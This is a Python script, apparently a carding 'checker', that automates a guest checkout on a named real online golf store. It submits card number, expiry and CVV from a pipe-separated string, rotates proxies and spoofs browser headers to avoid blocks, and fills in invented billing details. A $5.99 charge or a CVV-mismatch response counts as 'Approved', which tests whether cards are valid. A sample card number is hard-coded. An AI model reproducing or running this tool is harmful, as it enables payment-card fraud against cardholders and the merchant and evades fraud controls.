from retry import retry
from requests import Session
from proxys.proxy import get_random_proxy  # Importar la función desde proxys/proxy.py
import requests
import time

def cut_str(text: str, a: str, b: str) -> str:
    try:
        return text.split(a)[1].split(b)[0]
    except:
        return 'value not found'

class PayflowAuth:
    @retry(tries=3, delay=2, backoff=2)
    def main(self, card):
        session = None
        max_proxy_attempts = 3  # Número máximo de intentos con diferentes proxies
        proxy_attempts = 0

        while proxy_attempts < max_proxy_attempts:
            try:
                # Validar formato de tarjeta
                cc = card.split("|")
                if len(cc) != 4:
                    return 'Declined! ❌', 'Formato de tarjeta inválido. Use: cc|mm|aaaa|cvv'

                # Determinar tipo de tarjeta
                if cc[0][0] == '4':
                    cctype = 'VI'
                elif cc[0][0] == '5':
                    cctype = 'MC'
                elif cc[0][0] == '6':
                    cctype = 'AE'
                else:
                    return 'Declined! ❌', 'Tipo de tarjeta no soportado (solo Visa, Mastercard, Amex).'

                # Configurar sesión con proxy
                session = Session()
                
                # Obtener proxy y certificado
                proxy, cert_path = get_random_proxy()
                if not proxy:
                    proxy_attempts += 1
                    print(f"DEBUG: No se pudo obtener un proxy válido. Intento {proxy_attempts}/{max_proxy_attempts}")
                    if proxy_attempts < max_proxy_attempts:
                        time.sleep(2)
                        continue
                    return 'Declined! ❌', 'No se pudo configurar un proxy válido después de varios intentos'
                session.proxies.update(proxy)
                print(f"DEBUG: Usando proxy: {proxy['http']} (intento {proxy_attempts + 1}/{max_proxy_attempts})")

                # Encabezados base para simular un navegador real
                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'max-age=0',
                    'sec-ch-ua': '"Google Chrome";v="130", "Not=A?Brand";v="8", "Chromium";v="130"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
                }

                # Paso 1: Acceder a la página del producto
                req_1 = session.get('https://www.diamondtour.com/golf-accessories/head-covers/racer-driver-headcover.html', headers=headers, verify=cert_path if cert_path else True)
                print(f"DEBUG: Acceso a página del producto - Status: {req_1.status_code}")
                if req_1.status_code == 403:
                    raise requests.exceptions.HTTPError("HTTP 403: Acceso denegado en la página del producto")
                if req_1.status_code != 200:
                    return 'Declined! ❌', f'No se pudo acceder a la página del producto. Status: {req_1.status_code}'

                from_key = cut_str(req_1.text, 'name="form_key" type="hidden" value="', '"')
                print(f"DEBUG: form_key extraído: {from_key}")
                if from_key == 'value not found':
                    return 'Declined! ❌', 'No se pudo extraer el form_key.'

                # Paso 2: Agregar producto al carrito
                headers.update({
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.diamondtour.com',
                    'referer': 'https://www.diamondtour.com/golf-accessories/head-covers/racer-driver-headcover.html',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty'
                })
                data = {
                    'form_key': from_key,
                    'product': '9161',
                    'related_product': '',
                    'super_attribute[559]': '732',
                    'qty': '1'
                }
                response = session.post(
                    f'https://www.diamondtour.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuZGlhbW9uZHRvdXIuY29tL2dvbGYtYWNjZXNzb3JpZXMvaGVhZC1jb3ZlcnMvcmFjZXItZHJpdmVyLWhlYWRjb3Zlci5odG1s/product/9161/form_key/{from_key}/',
                    headers=headers,
                    data=data,
                    verify=cert_path if cert_path else True
                )
                print(f"DEBUG: Agregar al carrito - Status: {response.status_code}")
                if response.status_code == 403:
                    raise requests.exceptions.HTTPError("HTTP 403: Acceso denegado al agregar producto al carrito")
                if response.status_code != 200:
                    return 'Declined! ❌', f'No se pudo agregar el producto al carrito. Status: {response.status_code}'

                # Paso 3: Acceder al carrito
                headers.update({
                    'referer': 'https://www.diamondtour.com/golf-accessories/head-covers/racer-driver-headcover.html',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document'
                })
                response = session.get('https://www.diamondtour.com/checkout/cart/', headers=headers, verify=cert_path if cert_path else True)
                print(f"DEBUG: Acceso al carrito - Status: {response.status_code}")
                if response.status_code == 403:
                    raise requests.exceptions.HTTPError("HTTP 403: Acceso denegado al acceder al carrito")
                if response.status_code != 200:
                    return 'Declined! ❌', f'No se pudo acceder al carrito. Status: {response.status_code}'

                # Paso 4: Iniciar checkout
                headers.update({
                    'referer': 'https://www.diamondtour.com/checkout/cart/',
                })
                req_1 = session.get('https://www.diamondtour.com/checkout/onepage/', headers=headers, verify=cert_path if cert_path else True)
                print(f"DEBUG: Iniciar checkout - Status: {req_1.status_code}")
                if req_1.status_code == 403:
                    raise requests.exceptions.HTTPError("HTTP 403: Acceso denegado al iniciar checkout")
                if req_1.status_code != 200:
                    return 'Declined! ❌', f'No se pudo iniciar el checkout. Status: {req_1.status_code}'

                # Paso 5: Seleccionar método de pago como invitado
                headers.update({
                    'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://www.diamondtour.com',
                    'referer': 'https://www.diamondtour.com/checkout/onepage/',
                    'x-prototype-version': '1.7',
                    'x-requested-with': 'XMLHttpRequest',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty'
                })
                response = session.post('https://www.diamondtour.com/checkout/onepage/saveMethod/', headers=headers, data={'method': 'guest'}, verify=cert_path if cert_path else True)
                print(f"DEBUG: Seleccionar método de pago como invitado - Status: {response.status_code}")
                if response.status_code == 403:
                    raise requests.exceptions.HTTPError("HTTP 403: Acceso denegado al seleccionar método de pago")
                if response.status_code != 200:
                    return 'Declined! ❌', f'No se pudo seleccionar el método de pago como invitado. Status: {response.status_code}'

                # Paso 6: Guardar información de facturación
                headers.update({
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://www.diamondtour.com',
                    'referer': 'https://www.diamondtour.com/checkout/onepage/',
                    'x-prototype-version': '1.7',
                    'x-requested-with': 'XMLHttpRequest'
                })
                data = {
                    'billing[address_id]': '',
                    'billing[firstname]': 'Lucas',
                    'billing[lastname]': 'Lorenzo',
                    'billing[company]': 'OrganiMp',
                    'billing[email]': 'valerie.jenkins@gmail.com',
                    'billing[street][]': [
                        'E Little York Rd 7912',
                        'E Little York Rd 7912'
                    ],
                    'billing[city]': 'Norman',
                    'billing[region_id]': '12',
                    'billing[region]': '',
                    'billing[postcode]': '10010',
                    'billing[country_id]': 'US',
                    'billing[telephone]': '8194544131',
                    'billing[fax]': '',
                    'billing[customer_password]': '',
                    'billing[confirm_password]': '',
                    'billing[save_in_address_book]': '1',
                    'billing[use_for_shipping]': '1',
                    'form_key': from_key
                }
                response = session.post('https://www.diamondtour.com/checkout/onepage/saveBilling/', headers=headers, data=data, verify=cert_path if cert_path else True)
                print(f"DEBUG: Guardar información de facturación - Status: {response.status_code}")
                if response.status_code == 403:
                    raise requests.exceptions.HTTPError("HTTP 403: Acceso denegado al guardar información de facturación")
                if response.status_code != 200:
                    return 'Declined! ❌', f'No se pudo guardar la información de facturación. Status: {response.status_code}'

                # Paso 7: Selección de método de envío
                headers.update({
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://www.diamondtour.com',
                    'priority': 'u=1, i',
                    'referer': 'https://www.diamondtour.com/checkout/onepage/',
                    'x-prototype-version': '1.7',
                    'x-requested-with': 'XMLHttpRequest'
                })
                data = {
                    'shipping_method': 'shippingmodule_flatwithmethod',
                    'form_key': from_key
                }
                response = session.post('https://www.diamondtour.com/checkout/onepage/saveShippingMethod/', headers=headers, data=data, verify=cert_path if cert_path else True)
                print(f"DEBUG: Seleccionar método de envío - Status: {response.status_code}")
                if response.status_code == 403:
                    raise requests.exceptions.HTTPError("HTTP 403: Acceso denegado al seleccionar método de envío")
                if response.status_code != 200:
                    return 'Declined! ❌', f'No se pudo seleccionar el método de envío. Status: {response.status_code}'

                # Paso 8: Guardar información de pago
                headers.update({
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://www.diamondtour.com',
                    'referer': 'https://www.diamondtour.com/checkout/onepage/',
                    'x-prototype-version': '1.7',
                    'x-requested-with': 'XMLHttpRequest'
                })
                data = {
                    'payment[method]': 'verisign',
                    'payment[cc_type]': cctype,
                    'payment[cc_number]': cc[0],
                    'payment[cc_exp_month]': cc[1],
                    'payment[cc_exp_year]': cc[2],
                    'payment[cc_cid]': cc[3],
                    'form_key': from_key
                }
                response = session.post('https://www.diamondtour.com/checkout/onepage/savePayment/', headers=headers, data=data, verify=cert_path if cert_path else True)
                print(f"DEBUG: Guardar información de pago - Status: {response.status_code}")
                if response.status_code == 403:
                    raise requests.exceptions.HTTPError("HTTP 403: Acceso denegado al guardar información de pago")
                if response.status_code != 200:
                    return 'Declined! ❌', f'No se pudo guardar la información de pago. Status: {response.status_code}'

                # Paso 9: Verificar progreso del checkout
                headers.update({
                    'referer': 'https://www.diamondtour.com/checkout/onepage/',
                    'x-prototype-version': '1.7',
                    'x-requested-with': 'XMLHttpRequest'
                })
                response = session.get('https://www.diamondtour.com/checkout/onepage/progress/', params={'prevStep': 'payment'}, headers=headers, verify=cert_path if cert_path else True)
                print(f"DEBUG: Verificar progreso del checkout - Status: {response.status_code}")
                if response.status_code == 403:
                    raise requests.exceptions.HTTPError("HTTP 403: Acceso denegado al verificar progreso del checkout")
                if response.status_code != 200:
                    return 'Declined! ❌', f'No se pudo verificar el progreso del checkout. Status: {response.status_code}'

                # Paso 10: Enviar orden
                headers.update({
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://www.diamondtour.com',
                    'referer': 'https://www.diamondtour.com/checkout/onepage/',
                    'x-prototype-version': '1.7',
                    'x-requested-with': 'XMLHttpRequest'
                })
                data = {
                    'payment[method]': 'verisign',
                    'payment[cc_type]': cctype,
                    'payment[cc_number]': cc[0],
                    'payment[cc_exp_month]': cc[1],
                    'payment[cc_exp_year]': cc[2],
                    'payment[cc_cid]': cc[3],
                    'form_key': from_key,
                    'agreement[1]': '1'
                }
                response = session.post(f'https://www.diamondtour.com/checkout/onepage/saveOrder/form_key/{from_key}/', headers=headers, data=data, verify=cert_path if cert_path else True)
                print(f"DEBUG: Enviar orden - Status: {response.status_code}, Contenido: {response.text[:500]}")
                if response.status_code == 403:
                    raise requests.exceptions.HTTPError("HTTP 403: Acceso denegado al enviar orden")
                if response.status_code != 200:
                    return 'Declined! ❌', f'No se pudo enviar la orden. Status: {response.status_code}'

                # Procesar respuesta
                if '"success":false' in response.text:
                    msg = response.json()['error_messages']
                    if 'CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.' in msg:
                        return 'Approved! ✅', 'CVV2 Mismatch: 15004'
                    else:
                        return 'Declined! ❌', msg
                else:
                    return 'Approved! ✅', 'Charged! $5.99'

            except requests.exceptions.HTTPError as e:
                print(f"DEBUG: Error HTTP detectado: {e}")
                proxy_attempts += 1
                if proxy_attempts < max_proxy_attempts:
                    print(f"DEBUG: Reintentando con un nuevo proxy ({proxy_attempts + 1}/{max_proxy_attempts})")
                    if session:
                        session.close()
                    time.sleep(2)  # Pausa antes de reintentar
                    continue
                return 'Declined! ❌', f'Error HTTP: {str(e)}'
            except Exception as e:
                return 'Declined! ❌', f'Declined: 15005-This transaction cannot be processed, {str(e)}'
            finally:
                if session:
                    session.close()
        return 'Declined! ❌', f'Agotados los intentos con proxies ({max_proxy_attempts})'

if __name__ == "__main__":
    print(PayflowAuth().main('4426441313931192|10|2028|818'))